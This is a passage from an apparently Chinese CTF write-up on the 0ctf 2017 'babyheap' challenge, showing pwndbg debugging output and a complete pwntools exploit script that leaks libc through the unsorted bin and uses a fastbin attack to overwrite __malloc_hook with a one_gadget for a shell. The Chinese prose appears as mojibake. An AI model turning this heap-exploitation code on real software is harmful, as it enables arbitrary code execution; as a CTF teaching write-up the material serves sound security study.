Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">2</span><br>Index: <span class="hljs-number">0</span><br>Size: <span class="hljs-number">40</span><br>Content: aaaaaaaaaaaaaaaaaa<br>^C<br>Program received signal SIGINT, Interrupt.<br><span class="hljs-number">0x00007ffff7b04360</span> in __read_nocancel () at ../sysdeps/unix/syscall-template.S:<span class="hljs-number">84</span><br><span class="hljs-number">84</span>../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> RAX  <span class="hljs-number">0xfffffffffffffe00</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) â—‚â€” cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x15</span><br> RDI  <span class="hljs-number">0x0</span><br> RSI  <span class="hljs-number">0x555555757023</span> â—‚â€” <span class="hljs-number">0x20fe10000000000</span><br> R8   <span class="hljs-number">0x7ffff7fdd700</span> â—‚â€” <span class="hljs-number">0x7ffff7fdd700</span><br> R9   <span class="hljs-number">0x9</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x555555554a40</span> â—‚â€” xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffdd50</span> â—‚â€” <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdc20</span> â€”â–¸ <span class="hljs-number">0x7fffffffdc50</span> â€”â–¸ <span class="hljs-number">0x7fffffffdc70</span> â€”â–¸ <span class="hljs-number">0x5555555553e0</span> â—‚â€” push   r15<br> RSP  <span class="hljs-number">0x7fffffffdbf8</span> â€”â–¸ <span class="hljs-number">0x5555555551fd</span> â—‚â€” mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br> RIP  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) â—‚â€” cmp    rax, <span class="hljs-number">-0xfff</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º <span class="hljs-number">0x7ffff7b04360</span> &lt;__read_nocancel+<span class="hljs-number">7</span>&gt;     cmp    rax, <span class="hljs-number">-0xfff</span><br>   <span class="hljs-number">0x7ffff7b04366</span> &lt;__read_nocancel+<span class="hljs-number">13</span>&gt;    jae    read+<span class="hljs-number">73</span> &lt;<span class="hljs-number">0x7ffff7b04399</span>&gt;<br>    â†“<br>   <span class="hljs-number">0x7ffff7b04399</span> &lt;read+<span class="hljs-number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="hljs-number">0x2ccad8</span>]<br>   <span class="hljs-number">0x7ffff7b043a0</span> &lt;read+<span class="hljs-number">80</span>&gt;               neg    eax<br>   <span class="hljs-number">0x7ffff7b043a2</span> &lt;read+<span class="hljs-number">82</span>&gt;               mov    dword ptr fs:[rcx], eax<br>   <span class="hljs-number">0x7ffff7b043a5</span> &lt;read+<span class="hljs-number">85</span>&gt;               or     rax, <span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0x7ffff7b043a9</span> &lt;read+<span class="hljs-number">89</span>&gt;               ret    <br> <br>   <span class="hljs-number">0x7ffff7b043aa</span>                         nop    word ptr [rax + rax]<br>   <span class="hljs-number">0x7ffff7b043b0</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="hljs-number">0x2d2389</span>], <span class="hljs-number">0</span> &lt;<span class="hljs-number">0x7ffff7dd6740</span>&gt;<br>   <span class="hljs-number">0x7ffff7b043b7</span> &lt;write+<span class="hljs-number">7</span>&gt;               jne    write+<span class="hljs-number">25</span> &lt;<span class="hljs-number">0x7ffff7b043c9</span>&gt;<br>    â†“<br>   <span class="hljs-number">0x7ffff7b043c9</span> &lt;write+<span class="hljs-number">25</span>&gt;              sub    rsp, <span class="hljs-number">8</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚ rsp  <span class="hljs-number">0x7fffffffdbf8</span> â€”â–¸ <span class="hljs-number">0x5555555551fd</span> â—‚â€” mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>â”‚      <span class="hljs-number">0x7fffffffdc00</span> â—‚â€” <span class="hljs-number">0x28</span> <span class="hljs-comment">/* '(' */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>â”‚      <span class="hljs-number">0x7fffffffdc08</span> â€”â–¸ <span class="hljs-number">0x555555757010</span> â—‚â€” <span class="hljs-number">0x6161616161616161</span> (<span class="hljs-string">'aaaaaaaa'</span>)<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>â”‚      <span class="hljs-number">0x7fffffffdc10</span> â—‚â€” <span class="hljs-number">0x13</span><br>... â†“<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>â”‚ rbp  <span class="hljs-number">0x7fffffffdc20</span> â€”â–¸ <span class="hljs-number">0x7fffffffdc50</span> â€”â–¸ <span class="hljs-number">0x7fffffffdc70</span> â€”â–¸ <span class="hljs-number">0x5555555553e0</span> â—‚â€” push   r15<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>â”‚      <span class="hljs-number">0x7fffffffdc28</span> â€”â–¸ <span class="hljs-number">0x555555554f48</span> â—‚â€” jmp    <span class="hljs-number">0x555555554f4e</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>â”‚      <span class="hljs-number">0x7fffffffdc30</span> â—‚â€” <span class="hljs-number">0x0</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º f <span class="hljs-number">0</span>     <span class="hljs-number">7f</span>fff7b04360 __read_nocancel+<span class="hljs-number">7</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">5555555551f</span>d<br>   f <span class="hljs-number">2</span>     <span class="hljs-number">555555554f</span>48<br>   f <span class="hljs-number">3</span>     <span class="hljs-number">555555555188</span><br>   f <span class="hljs-number">4</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>Program received signal SIGINT<br>pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x3b0326206000</span>     <span class="hljs-number">0x3b0326207000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x555555554000</span>     <span class="hljs-number">0x555555556000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWNé¢˜/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555755000</span>     <span class="hljs-number">0x555555756000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWNé¢˜/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555756000</span>     <span class="hljs-number">0x555555757000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWNé¢˜/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555757000</span>     <span class="hljs-number">0x555555778000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>å†çœ‹ä¸€ä¸‹ 0x3b0326206000 è¿™ç‰‡å†…å­˜åŒºåŸŸï¼Œç¡®å®šæ˜¯ç¨‹åºç»“æ„ä½“ä¸­æŒ‡é’ˆå­˜æ”¾çš„ä½ç½®ï¼Œæ ‡æ³¨ä¸€ä¸‹ï¼š</p><p>è¿™é‡Œæˆ‘é‡æ–°è°ƒè¯•äº†ä¸€ä¸ªgdb</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xb422b6be0c0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be0d0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000014</span><br>    #chunk_flag<span class="hljs-meta">#size</span><br><span class="hljs-number">0xb422b6be0e0</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk_data_ptr<br><span class="hljs-number">0xb422b6be0f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be100</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be130</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h2 id="exp-è®²è§£"><a href="#exp-è®²è§£" class="headerlink" title="exp è®²è§£"></a>exp è®²è§£</h2><p>expçš„ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>expæ¥è‡ª@yichenå¸ˆå‚…ï¼š<a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a></p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br>elf = ELF(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br><br><span class="hljs-comment">#é¦–å…ˆæ˜¯å®šä¹‰çš„ä¸€äº›å‡½æ•°ï¼Œå¯¹åº”ç€ç¨‹åºçš„åŠŸèƒ½</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-comment">#é¦–å…ˆç”³è¯·4ä¸ªfast chunkå’Œ1ä¸ªsmall chunk</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br><br><span class="hljs-comment">#freeä¸¤ä¸ª,è¿™æ—¶å€™ä¼šæ”¾åˆ°fastbinsä¸­,è€Œä¸”å› ä¸ºæ˜¯åè¿›çš„,æ‰€ä»¥</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment">#è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å»å¯¹index0è¿›è¡Œfillæ“ä½œ,ä»–å°±ä¼šæŠŠindex2çš„æŒ‡é’ˆçš„æœ«ä½æ”¹æˆ0x80,ä¹Ÿå°±æŒ‡å‘äº†index4</span><br><span class="hljs-comment">#è§£é‡Šä¸€ä¸‹,å‰é¢ç”³è¯·äº†4å—0x10çš„,åŠ ä¸Šchunkçš„ä¸€äº›ä¿¡æ¯,åˆèµ·æ¥æ˜¯0x80</span><br><span class="hljs-comment">#æ‰€ä»¥æŠŠé‚£ä¸ªæœ«ä½æ”¹æˆ0x80å°±æŒ‡å‘äº†index4,è¿™æ ·chunk4å°±è¢«æ”¾åˆ°äº†fastbinsä¸­</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br><br><span class="hljs-comment">#ç„¶åå†é€šè¿‡index3å»è¿›è¡Œå†™å…¥,æŠŠindex4çš„å¤§å°æ”¹æˆ0x21</span><br><span class="hljs-comment">#è¿™ä¹ˆåšæ˜¯å› ä¸ºå½“ç”³è¯·index4è¿™å—å†…å­˜çš„æ—¶å€™,ä»–ä¼šæ£€æŸ¥å¤§å°æ˜¯ä¸æ˜¯fast chunkçš„èŒƒå›´å†…</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#æ”¹å¥½index4çš„å¤§å°ä¹‹åå»ç”³è¯·ä¸¤æ¬¡ï¼Œè¿™æ ·å°±æŠŠåŸæ¥çš„fastbinsä¸­çš„ç»™ç”³è¯·å‡ºæ¥äº†</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment">#ç”³è¯·æˆåŠŸä¹‹åindex2å°±æŒ‡å‘index4</span><br><span class="hljs-comment">#ä¸ºäº†è®©index4èƒ½å¤Ÿè¢«æ”¾åˆ°unsortedbinsä¸­,è¦æŠŠå®ƒçš„å¤§å°æ”¹å›æ¥</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#å†ç”³è¯·ä¸€ä¸ªé˜²æ­¢index4ä¸top chunkåˆå¹¶äº†</span><br>alloc(<span class="hljs-number">0x80</span>)<br><br><span class="hljs-comment">#è¿™æ—¶å€™freeå°±ä¼šæŠŠindex4æ”¾åˆ°unsortedä¸­äº†</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#å› ä¸ºindex2æ˜¯æŒ‡å‘index4çš„ï¼Œæ‰€ä»¥ç›´æ¥æŠŠindex2ç»™dumpä¸€ä¸‹å°±èƒ½æ‹¿åˆ°index4ä¸­å‰ä¸€éƒ¨åˆ†çš„å†…å®¹äº†</span><br><span class="hljs-comment">#main_arenaä¸libcåç§»ä¸º0x3c4b20(æ–‡æœ«æœ‰å·¥å…·ç®—)</span><br><span class="hljs-comment">#å†åŠ ä¸Šmain_arenaä¸unsortedbinçš„åç§»,å¾—åˆ°unsortedbinsä¸libcçš„åç§»</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#è¿™å‡½æ•°è¿˜ä¸å¤ªæ˜ç™½</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#æ­¤æ—¶å› ä¸ºfastbinsä¸­æ²¡æœ‰äº†,æ‰€ä»¥ä»unsortedbinsä¸­æ‰¾</span><br>alloc(<span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment">#index2è¿˜æ˜¯æŒ‡å‘index4é‚£ä¸ªåœ°æ–¹æˆ‘ä»¬å¯ä»¥å…ˆé‡Šæ”¾index4</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#ç„¶åä¿®æ”¹fdæŒ‡é’ˆ,é€šè¿‡index2å¾€index4ä¸Šå†™ä¸ºmalloc_hook,è¿™æ ·å†æ¬¡ç”³è¯·çš„æ—¶å€™ä¼šåˆ†é…åˆ°è¿™ä¸ªåœ°å€</span><br><span class="hljs-comment">#ä½†é—®é¢˜æ˜¯æˆ‘ä»¬å»ç”³è¯·çš„æ—¶å€™ä¼šæ£€æŸ¥sizeæ˜¯ä¸æ˜¯ fakefd + 8 == å½“å‰fastbinçš„å¤§å°</span><br><span class="hljs-comment">#è¿™ä¸ªåœ°å€æ˜¯main_arena-0x40+0xd,å…·ä½“çœ‹åé¢å›¾ç‰‡è§£é‡Š</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br><br><span class="hljs-comment">#è¿™æ—¶å€™å†å»ç”³è¯·ä¸¤ä¸ª,ç¬¬ä¸€ä¸ªæ˜¯ç»™å‰é¢freeçš„index4,ç¬¬äºŒä¸ªå°±ä¼šåˆ†é…åˆ°malloc_hookå¤„</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index6</span><br><br><span class="hljs-comment">#ç„¶åå¾€malloc_hookä¸Šå†™one_gadgetçš„åœ°å€</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-comment">#å†ç”³è¯·ä¸€ä¸‹è§¦å‘one_gadget</span><br>alloc(<span class="hljs-number">255</span>)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="æ¼æ´åˆ©ç”¨æ€è·¯"><a href="#æ¼æ´åˆ©ç”¨æ€è·¯" class="headerlink" title="æ¼æ´åˆ©ç”¨æ€è·¯"></a>æ¼æ´åˆ©ç”¨æ€è·¯</h3><p>ä»ä¸Šé¢çš„å†…å®¹å¯ä»¥çœ‹å‡ºï¼Œä¸»è¦çš„æ¼æ´æ˜¯ä»»æ„é•¿åº¦å †æº¢å‡ºã€‚ç”±äºè¯¥ç¨‹åºå‡ ä¹æ‰€æœ‰ä¿æŠ¤éƒ½å¼€å¯äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦æœ‰ä¸€äº›æ³„æ¼æ‰å¯ä»¥æ§åˆ¶ç¨‹åºçš„æµç¨‹ã€‚åŸºæœ¬åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ unsorted bin åœ°å€æ³„æ¼ libc åŸºåœ°å€ã€‚ï¼ˆç”¨unsortedbinçš„åŸå› ä¹‹åå†è¯´ï¼‰</li><li>åˆ©ç”¨ fastbin attackä¸­çš„Arbitrary AllocæŠ€æœ¯å°†chunk åˆ†é…åˆ° malloc_hook é™„è¿‘ã€‚</li></ul><h3 id="1-leak-libc-addr"><a href="#1-leak-libc-addr" class="headerlink" title="1. leak libc_addr"></a>1. leak libc_addr</h3><h4 id="1-1-æ¨¡ä»¿ç¨‹åºåŠŸèƒ½"><a href="#1-1-æ¨¡ä»¿ç¨‹åºåŠŸèƒ½" class="headerlink" title="1-1 